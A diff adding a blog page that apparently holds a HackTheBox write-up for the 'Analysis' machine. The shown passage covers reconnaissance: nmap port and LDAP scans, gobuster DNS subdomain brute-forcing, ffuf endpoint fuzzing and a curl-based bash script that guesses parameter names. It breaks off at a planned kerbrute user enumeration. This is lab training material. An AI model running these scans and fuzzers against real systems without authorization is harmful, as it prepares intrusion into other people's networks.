@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Analysis - HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Analysis - HackTheBox | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Analysis - HackTheBox" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/analysis-htb" />
+<meta property="og:url" content="http://localhost:4000/analysis-htb" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-01-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Analysis - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://alexbsec.github.io/"},"dateModified":"2024-01-24T00:00:00+00:00","datePublished":"2024-01-24T00:00:00+00:00","description":"Introduction","headline":"Analysis - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/analysis-htb"},"url":"http://localhost:4000/analysis-htb"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/analysis-htb $</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Analysis - HackTheBox</h2>
+  <time datetime="2024-01-24T00:00:00+00:00" class="by-line">24 Jan 2024</time>
+  <p>Estimated read time: 23 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>Let’s solve another machine from HackTheBox season 4: Analysis. This box is classified as Hard, so buckle up and prepare for battle!</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>For our approach mindset, we shall separate it as the following steps:</p>
+
+<ol>
+  <li>Reconnaissance</li>
+  <li>Getting foothold</li>
+  <li>System enumeration</li>
+  <li>Privilege escalation</li>
+</ol>
+
+<h2 id="step-1---reconnaissance"><a href="#step1-recon"></a>Step 1 - Reconnaissance</h2>
+
+<p>Let’s start by enumerting the machine’s TCP open ports with Nmap:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-A</span> <span class="nt">-oN</span> ports.nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-T4</span> 10.129.33.58
+<span class="c"># Nmap 7.94 scan initiated Sun Jan 21 20:09:39 2024 as: nmap -p- -A -oN ports.nmap --min-rate 1000 -T4 10.129.33.58</span>
+Nmap scan report <span class="k">for </span>10.129.33.58
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65507 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-01-21 23:13:31Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+3306/tcp  open  mysql         MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span class="s2">"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"</span>
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.<span class="s2">"
+|_    HY000
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49683/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49709/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94%I=7%D=1/21%Time=65AD7A58%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\</span>
+SF:0<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r
+SF:(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
+SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>
+SF:1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY00
+SF:0")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0
+SF:\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>2
+SF:0message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCookie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\</span>
+SF:x1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\</span>
+SF:x08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\
+SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(FourOhFourRequest,9,
+SF:"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDString,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>
+SF:1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>
+SF:08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse
+SF:<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOpt
+SF:ions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LANDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
+SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Not
+SF:esRPC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x
+SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
+SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Inv
+SF:alid<span class="se">\x</span>20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>
+SF:05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01
+SF:<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=1/21%OT=53%CT=1%CU=38916%PV=Y%DS=2%DC=T%G=Y%TM=65AD7AA
+OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
+OS:U)SEQ(SP=103%GCD=2%ISR=107%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS%O
+OS:2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=FF
+OS:FF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5
+OS:3CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
+OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
+OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 3h02m30s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-01-21T23:14:40
+|_  start_date: N/A
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT       ADDRESS
+1   129.49 ms 10.10.14.1
+2   129.54 ms 10.129.33.58
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 21 20:12:21 2024 -- 1 IP address (1 host up) scanned in 162.35 seconds
+</span></code></pre></div></div>
+
+<p>We can see a bunch of services, but the ones that are interesting to me at a first glance are ports 53, 80, 88 and 389. If we attempt to access the website, we get a 404.</p>
+
+<p>Let’s shift our attention to other services for now. I’ve decided to run Nmap again the script <code class="language-plaintext highlighter-rouge">ldap* and not brute</code> to see if we can find the domain name and other useful information.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> <span class="nt">-oN</span> ldap-enum.txt 10.129.33.58
+<span class="o">[</span>...snip...]
+,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       schemaNamingContext: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 377005
+|       dsServiceName: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>DC-ANALYSIS,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       dnsHostName: DC-ANALYSIS.analysis.htb
+|       defaultNamingContext: <span class="nv">DC</span><span class="o">=</span>analysis,DC<span class="o">=</span>htb
+|       currentTime: 20240122225140.0Z
+|_      configurationNamingContext: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>analysis,DC<span class="o">=</span>htb
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>As we can see, the DC for this is <code class="language-plaintext highlighter-rouge">analysis.htb</code>. Maybe the reason why the browser was not able to fetch the website through the IP address is because this domain name must be added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Let’s add it to the with <code class="language-plaintext highlighter-rouge">sudo vim /etc/hosts</code> and add <code class="language-plaintext highlighter-rouge">&lt;machine-ip&gt; analysis.htb</code> at the end of the file. After that, let’s try to access the webpage again:</p>
+
+<p><img src="../figs/analysis01.png" alt="analysis homepage" /></p>
+
+<p>Alright! This seems like a nice website. However, I have not found anything useful within the page or DOM, so I decided to enumerate it with <code class="language-plaintext highlighter-rouge">ffuf</code>. Without any success, I tried to move on to another enumeration method. Since port 53 is open, we might be able to find subdomains associated with the <code class="language-plaintext highlighter-rouge">analysis.htb</code> name service. For that, I’ve ran <code class="language-plaintext highlighter-rouge">gobuster</code> with the DNS flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster dns <span class="nt">-d</span> analysis.htb <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-r</span> analysis.htb:53
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Domain:     analysis.htb
+<span class="o">[</span>+] Threads:    10
+<span class="o">[</span>+] Resolver:   analysis.htb:53
+<span class="o">[</span>+] Timeout:    1s
+<span class="o">[</span>+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>DNS enumeration mode
+<span class="o">===============================================================</span>
+Found: www.analysis.htb
+
+Found: internal.analysis.htb
+
+Found: gc._msdcs.analysis.htb
+
+Found: domaindnszones.analysis.htb
+
+Found: forestdnszones.analysis.htb
+                                                                                                  
+Progress: 19966 / 19967 <span class="o">(</span>99.99%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>As we can see, there are some subdomains available for us. Before trying to access them, we must add them to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file like this: <code class="language-plaintext highlighter-rouge">&lt;machine-ip&gt; analysis.htb internal.analysis.htb domaindnszones.analysis.htb forestdnszones.analysis.htb ...</code>. After that, let’s examine <code class="language-plaintext highlighter-rouge">internal.analysis.htb</code>:</p>
+
+<p><img src="../figs/analysis02.png" alt="internal homepage" /></p>
+
+<p>As we can see, this page is unreachable for now. But that does not mean we are not able to enumerate this subdomain for other endpoints. For that reason, I decided to run <code class="language-plaintext highlighter-rouge">ffuf</code> to find possible endpoints:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://internal.analysis.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+Users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 136ms]
+dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 139ms]
+\                       [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 149ms]
+employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 135ms]
+</span></code></pre></div></div>
+
+<p>As we can see, there are some interesting endpoints that might have hidden ways in the web-service. After some failed attempts, I decided to append <code class="language-plaintext highlighter-rouge">.php</code> extension at the end of the endpoints and got some interesting results. Starting with the <code class="language-plaintext highlighter-rouge">/Users/</code> endpoint, we have:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://internal.analysis.htb/users/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-1.0.txt <span class="nt">-e</span> .php
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 173ms]
+</span></code></pre></div></div>
+
+<p>Accessing the page, we have:</p>
+
+<p><img src="../figs/analysis-internal1.png" /></p>
+
+<p>It seems the page is expecting a GET parameter in the request. For that, we will try to find what is the correct parameter with a bash script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">WORDLIST_PATH</span><span class="o">=</span><span class="s2">"/usr/share/wordlists/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt"</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$WORDLIST_PATH</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Wordlist file does not exist at </span><span class="nv">$WORDLIST_PATH</span><span class="s2">"</span>
+        <span class="nb">exit </span>1
+<span class="k">fi
+
+while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span> <span class="k">do
+        </span><span class="nb">echo</span> <span class="s2">"Testing parameter name '</span><span class="nv">$line</span><span class="s2">'..."</span>
+        <span class="nv">res</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"http://internal.analysis.htb/Users/list.php?</span><span class="nv">$line</span><span class="s2">"</span><span class="si">)</span>
+        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$res</span> <span class="o">!=</span> <span class="k">*</span><span class="s2">"missing parameter"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+                </span><span class="nb">echo</span> <span class="s2">"Parameter found: </span><span class="nv">$line</span><span class="s2">"</span>
+                <span class="nb">exit </span>0
+        <span class="k">fi
+done</span> &lt; <span class="s2">"</span><span class="nv">$WORDLIST_PATH</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p>This will loke for different responses by passing different parameter names to it. After running it, we find that the parameter name is <code class="language-plaintext highlighter-rouge">name</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./find-param.sh
+<span class="o">[</span>...snip...]
+Testing parameter name <span class="s1">'embedded'</span>...
+Testing parameter name <span class="s1">'enc_user'</span>...
+Testing parameter name <span class="s1">'f'</span>...
+Testing parameter name <span class="s1">'fiatId'</span>...
+Testing parameter name <span class="s1">'format'</span>...
+Testing parameter name <span class="s1">'full_text'</span>...
+Testing parameter name <span class="s1">'href'</span>...
+Testing parameter name <span class="s1">'id'</span>...
+Testing parameter name <span class="s1">'id_type'</span>...
+Testing parameter name <span class="s1">'include'</span>...
+Testing parameter name <span class="s1">'k4'</span>...
+Testing parameter name <span class="s1">'k'</span>...
+Testing parameter name <span class="s1">'keyURL'</span>...
+Testing parameter name <span class="s1">'language'</span>...
+Testing parameter name <span class="s1">'limit'</span>...
+Testing parameter name <span class="s1">'list'</span>...
+Testing parameter name <span class="s1">'list_id'</span>...
+Testing parameter name <span class="s1">'lon'</span>...
+Testing parameter name <span class="s1">'m4'</span>...
+Testing parameter name <span class="s1">'name'</span>...
+Parameter found: name
+</code></pre></div></div>
+
+<p>Accessing the page, we find this:</p>
+
+<p><img src="../figs/analysis03.png" alt="parameter name on list.php" /></p>
+
+<p>After poking around with this parameter, I’ve got nowhere. So I decided to move on to another endpoint. Since the <code class="language-plaintext highlighter-rouge">/dashboard</code> endpoint is giving us Access Denied, let’s enumerate the <code class="language-plaintext highlighter-rouge">/employees</code> endpoint with <code class="language-plaintext highlighter-rouge">ffuf</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://internal.analysis.htb/employees/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-1.0.txt <span class="nt">-e</span> .php   
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/employees/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 182ms]
+</span></code></pre></div></div>
+
+<p>And we found a login page!</p>
+
+<p><img src="../figs/analysis04.png" alt="login page" /></p>
+
+<p>Ok, so we need a pair of credentials to login. Let’s move to another service and see if we can leak something useful. Note that we have Kerberos running, which means we can use <code class="language-plaintext highlighter-rouge">kerbrute</code> to find valid emails. The internal emails used here must be <code class="language-plaintext highlighter-rouge">@analysis.htb</code>. Let’s run:</p>
+
